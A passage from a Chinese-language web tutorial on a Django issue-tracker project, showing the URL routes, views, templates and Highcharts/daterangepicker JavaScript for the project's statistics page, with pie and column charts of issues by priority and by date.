class="string">'chart'</span>, config)</span></span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br><span class="line">  </span><br><span class="line">       &#125;</span><br><span class="line">   <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>后端处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">issues_chart</span><span class="params">(request,project_id)</span>:</span></span><br><span class="line">    <span class="string">""" 概览页面生成highcharts所需的数据"""</span></span><br><span class="line">    today = datetime.datetime.now().date()</span><br><span class="line">    date_dict = collections.OrderedDict()  <span class="comment"># 有序字典</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">30</span>):</span><br><span class="line">        date = today - datetime.timedelta(days=i)</span><br><span class="line">        date_dict[date.strftime(<span class="string">'%Y-%m-%d'</span>)] = [time.mktime(date.timetuple()) * <span class="number">1000</span>,</span><br><span class="line">                                                <span class="number">0</span>]  <span class="comment"># time.mktime(date.timetuple())将当前时间转换为时间戳</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 最近30天，每天创建的问题数量 &amp; 根据日期分组</span></span><br><span class="line">    <span class="comment">#select id,name,email from table;</span></span><br><span class="line">    <span class="comment">#select id,name,strftime("%Y-%m-%d",create_datetime) as ctime from table; # strftime字符串格式化</span></span><br><span class="line">    <span class="comment"># mysql的字符串格式化DATE_FORMAT(web_transaction.create_datetime,'%%Y-%%m-%%d')</span></span><br><span class="line"></span><br><span class="line">    result = models.Issues.objects.filter(project_id=project_id,create_datetime__gte=today-datetime.timedelta(days=<span class="number">30</span>)).extra(</span><br><span class="line">        select=&#123;<span class="string">'ctime'</span>:<span class="string">'strftime("%%Y-%%m-%%d",web_issues.create_datetime)'</span>&#125;).values(<span class="string">'ctime'</span>).annotate(ct=Count(<span class="string">'id'</span>))</span><br><span class="line">    <span class="comment"># print(result)</span></span><br><span class="line">    <span class="comment"># &lt;QuerySet [&#123;'ctime': '2020-07-24', 'ct': 2&#125;]&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> item  <span class="keyword">in</span> result:</span><br><span class="line">        date_dict[item[<span class="string">'ctime'</span>]][<span class="number">1</span>] = item[<span class="string">'ct'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>:<span class="literal">True</span>,<span class="string">'data'</span>:list(date_dict.values())&#125;)</span><br></pre></td></tr></table></figure></li></ul><h3 id="13-3-统计"><a href="#13-3-统计" class="headerlink" title="13.3 统计"></a>13.3 统计</h3><h4 id="13-3-1-构造统计页面的url地址"><a href="#13-3-1-构造统计页面的url地址" class="headerlink" title="13.3.1 构造统计页面的url地址"></a>13.3.1 构造统计页面的url地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># 统计页面</span></span><br><span class="line">    url(<span class="string">r'^statistics/$'</span>, statistics.statistics, name=<span class="string">'statistics'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure><h4 id="13-3-2-统计页面的视图函数"><a href="#13-3-2-统计页面的视图函数" class="headerlink" title="13.3.2 统计页面的视图函数"></a>13.3.2 统计页面的视图函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.db.models <span class="keyword">import</span> Count</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> web <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">statistics</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">""" 统计页面 """</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'manage/statistics.html'</span>)</span><br></pre></td></tr></table></figure><h4 id="13-3-3-统计页面的前端代码"><a href="#13-3-3-统计页面的前端代码" class="headerlink" title="13.3.3 统计页面的前端代码"></a>13.3.3 统计页面的前端代码</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'layout/manage.html' %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% load static %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block css %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/daterangepicker/daterangepicker.css' %&#125;"</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container-fluid"</span> <span class="attr">style</span>=<span class="string">"margin-top: 20px"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span> <span class="attr">style</span>=<span class="string">"width: 300px"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-addon"</span>&gt;</span>日期范围<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"rangePicker"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span> <span class="attr">style</span>=<span class="string">"margin-top: 20px"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-8"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-bar-chart"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 人员工作进度</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"projectUser"</span> <span class="attr">style</span>=<span class="string">"height: 300px"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-pie-chart"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 优先级统计</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"priority"</span> <span class="attr">style</span>=<span class="string">"height: 300px"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block js %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 日期选择器 daterangepicker插件</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 柱状图</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 饼状图</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h4 id="13-3-4-使用daterangepicker插件"><a href="#13-3-4-使用daterangepicker插件" class="headerlink" title="13.3.4 使用daterangepicker插件"></a>13.3.4 使用daterangepicker插件</h4><ul><li><p>引入js &amp; css</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/daterangepicker/daterangepicker.css' %&#125;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/daterangepicker/moment.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/daterangepicker/daterangepicker.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>配置daterangepicker</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">        initDateRangePicker();</span><br><span class="line"><span class="actionscript">        priority(moment().format(<span class="string">'YYYY-MM-DD'</span>), moment().add(<span class="number">1</span>, <span class="string">'day'</span>).format(<span class="string">'YYYY-MM-DD'</span>));</span></span><br><span class="line"><span class="actionscript">        projectUser(moment().format(<span class="string">'YYYY-MM-DD'</span>), moment().add(<span class="number">1</span>, <span class="string">'day'</span>).format(<span class="string">'YYYY-MM-DD'</span>));</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">/* 日期选择器 */</span></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">initDateRangePicker</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> option = &#123;</span></span><br><span class="line"><span class="actionscript">            maxDate: moment(),   <span class="comment">// 最多只能选当前一天，后面不能选择</span></span></span><br><span class="line"><span class="actionscript">            alwaysShowCalendars: <span class="literal">true</span>,   <span class="comment">//  显示日历</span></span></span><br><span class="line"><span class="actionscript">            showWeekNumbers: <span class="literal">true</span>,   <span class="comment">// 显示星期</span></span></span><br><span class="line"><span class="actionscript">            ranges: &#123;    <span class="comment">//  自定义时间</span></span></span><br><span class="line"><span class="actionscript">                <span class="string">'今天'</span>: [moment(), moment()],</span></span><br><span class="line"><span class="actionscript">                <span class="string">'昨天'</span>: [moment().subtract(<span class="number">1</span>, <span class="string">'day'</span>), moment().subtract(<span class="number">1</span>, <span class="string">'day'</span>)],</span></span><br><span class="line"><span class="actionscript">                <span class="string">'最近7天'</span>: [moment().subtract(<span class="number">6</span>, <span class="string">'day'</span>), moment()],</span></span><br><span class="line"><span class="actionscript">                <span class="string">'最近30天'</span>: [moment().subtract(<span class="number">29</span>, <span class="string">'day'</span>), moment()],</span></span><br><span class="line"><span class="actionscript">                <span class="string">'本月'</span>: [moment().startOf(<span class="string">'month'</span>), moment().endOf(<span class="string">'month'</span>)],</span></span><br><span class="line">            &#125;,</span><br><span class="line">            locale: &#123;</span><br><span class="line"><span class="actionscript">                format: <span class="string">'YYYY-MM-DD'</span>,</span></span><br><span class="line"><span class="actionscript">                separator: <span class="string">' 至 '</span>,</span></span><br><span class="line"><span class="actionscript">                applyLabel: <span class="string">'确定'</span>,</span></span><br><span class="line"><span class="actionscript">                cancelLabel: <span class="string">'取消'</span>,</span></span><br><span class="line"><span class="actionscript">                fromLabel: <span class="string">'开始'</span>,</span></span><br><span class="line"><span class="actionscript">                toLabel: <span class="string">'结束'</span>,</span></span><br><span class="line"><span class="actionscript">                customRangeLabel: <span class="string">'自定义'</span>,</span></span><br><span class="line"><span class="actionscript">                weekLabel: <span class="string">'W'</span>,</span></span><br><span class="line"><span class="actionscript">                daysOfWeek: [<span class="string">'一'</span>, <span class="string">'二'</span>, <span class="string">'三'</span>, <span class="string">'四'</span>, <span class="string">'五'</span>, <span class="string">'六'</span>, <span class="string">'日'</span>],</span></span><br><span class="line"><span class="actionscript">                monthNames: [<span class="string">'一月'</span>, <span class="string">'二月'</span>, <span class="string">'三月'</span>, <span class="string">'四月'</span>, <span class="string">'五月'</span>, <span class="string">'六月'</span>, <span class="string">'七月'</span>, <span class="string">'八月'</span>, <span class="string">'九月'</span>, <span class="string">'十月'</span>, <span class="string">'十一月'</span>, <span class="string">'十二月'</span>],</span></span><br><span class="line">                firstDay: 1</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="javascript">        $(<span class="string">'#rangePicker'</span>).daterangepicker(option, <span class="function"><span class="keyword">function</span> (<span class="params">start, end, label</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 选择时间后函数自动被触发</span></span></span><br><span class="line"><span class="actionscript">            priority(start.format(<span class="string">'YYYY-MM-DD'</span>), end.add(<span class="number">1</span>, <span class="string">'day'</span>).format(<span class="string">'YYYY-MM-DD'</span>));</span></span><br><span class="line"><span class="actionscript">            projectUser(start.format(<span class="string">'YYYY-MM-DD'</span>), end.add(<span class="number">1</span>, <span class="string">'day'</span>).format(<span class="string">'YYYY-MM-DD'</span>));</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="13-3-5-饼状图"><a href="#13-3-5-饼状图" class="headerlink" title="13.3.5 饼状图"></a>13.3.5 饼状图</h4><ul><li><p>构造饼状图的url地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># 统计页面</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 饼状图</span></span><br><span class="line">    url(<span class="string">r'^statistics/priority$'</span>, statistics.statistics_priority, name=<span class="string">'statistics_priority'</span>),</span><br><span class="line"></span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure></li><li><p>前端引用HighCharts ，配置 HighCharts </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/HighCharts/highcharts.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> PRIORITY_API = <span class="string">"&#123;% url 'statistics_priority' project_id=request.tracer.project.id%&#125;"</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> PROJECT_USER_API = <span class="string">"&#123;% url 'statistics_project_user' project_id=request.tracer.project.id%&#125;"</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="actionscript">    <span class="comment">/* 饼状元 */</span></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">priority</span><span class="params">(start, end)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> config = &#123;</span></span><br><span class="line">            chart: &#123;</span><br><span class="line"><span class="actionscript">                type: <span class="string">'pie'</span></span></span><br><span class="line">            &#125;,</span><br><span class="line">            title: &#123;</span><br><span class="line"><span class="actionscript">                text: <span class="literal">null</span></span></span><br><span class="line">            &#125;,</span><br><span class="line">            credits: &#123;</span><br><span class="line"><span class="actionscript">                enable: <span class="literal">false</span> <span class="comment">// 关闭版权</span></span></span><br><span class="line">            &#125;,</span><br><span class="line">            tooltip: &#123;</span><br><span class="line"><span class="handlebars"><span class="xml">                pointFormat: '&#123;series.name&#125;: <span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;point.y&#125;%<span class="tag">&lt;/<span class="name">b</span>&gt;</span>'</span></span></span><br><span class="line">            &#125;,</span><br><span class="line">            plotOptions: &#123;</span><br><span class="line">                pie: &#123;</span><br><span class="line"><span class="actionscript">                    allowPointSelect: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">                    cursor: <span class="string">'pointer'</span>,</span></span><br><span class="line">                    dataLabels: &#123;</span><br><span class="line"><span class="actionscript">                        enabled: <span class="literal">false</span></span></span><br><span class="line">                    &#125;,</span><br><span class="line"><span class="actionscript">                    showInLegend: <span class="literal">true</span></span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            series: [&#123;</span><br><span class="line"><span class="actionscript">                name: <span class="string">'优先级'</span>,</span></span><br><span class="line"><span class="actionscript">                colorByPoint: <span class="literal">true</span>,</span></span><br><span class="line">                data: []</span><br><span class="line">            &#125;]</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line">            url: PRIORITY_API,</span><br><span class="line"><span class="actionscript">            type: <span class="string">"GET"</span>,</span></span><br><span class="line">            data: &#123;start: start, end: end&#125;,</span><br><span class="line"><span class="actionscript">            dataType: <span class="string">"JSON"</span>,</span></span><br><span class="line"><span class="actionscript">            success: <span class="function"><span class="keyword">function</span> <span class="params">(res)</span> </span>&#123;</span></span><br><span class="line">                config.series[0].data = res.data;</span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> chart = Highcharts.chart(<span class="string">'priority'</span>, config)</span></span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>后端配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">statistics_priority</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">""" 优先级生成饼状图 """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 找到所有的问题，根据优先级分组，然后统计数量</span></span><br><span class="line">    start = request.GET.get(<span class="string">'start'</span>)</span><br><span class="line">    end = request.GET.get(<span class="string">'end'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.构造字典</span></span><br><span class="line">    data_dict = collections.OrderedDict()</span><br><span class="line">    <span class="keyword">for</span> key, text <span class="keyword">in</span> models.Issues.priority_choices:</span><br><span class="line">        data_dict[key] = &#123;<span class="string">'name'</span>: text, <span class="string">'y'</span>: <span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.去数据查询所有分组得到的数据量</span></span><br><span class="line">    result = models.Issues.objects.filter(project_id=project_id, create_datetime__gte=start,</span><br><span class="line">                                          create_datetime__lt=end).values(<span class="string">'priority'</span>).annotate(ct=Count(<span class="string">'id'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3.把分组的数据更新到data_dict中</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        data_dict[item[<span class="string">'priority'</span>]][<span class="string">'y'</span>] = item[<span class="string">'ct'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>, <span class="string">'data'</span>: list(data_dict.values())&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="13-3-6-矩形图"><a href="#13-3-6-矩形图" class="headerlink" title="13.3.6 矩形图"></a>13.3.6 矩形图</h4><ul><li><p>构造矩形图的url地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># 统计页面</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 饼状图</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 矩形图</span></span><br><span class="line">    url(<span class="string">r'^statistics/project/user$'</span>, statistics.statistics_project_user, name=<span class="string">'statistics_project_user'</span>),</span><br><span class="line"></span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure></li><li><p>前端配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 矩形图*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">projectUser</span>(<span class="params">start, end</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> config = &#123;</span><br><span class="line">        chart: &#123;</span><br><span class="line">            type: <span class="string">'column'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        title: &#123;</span><br><span class="line">            text: <span class="literal">null</span></span><br><span class="line">        &#125;,</span><br><span class="line">        credits: &#123;</span><br><span class="line">            enable: <span class="literal">false</span> <span class="comment">// 关闭版权</span></span><br><span class="line">        &#125;,</span><br><span class="line">        xAxis: &#123;</span><br><span class="line">            categories: [<span class="string">'苹果'</span>, <span class="string">'橘子'</span>, <span class="string">'梨'</span>, <span 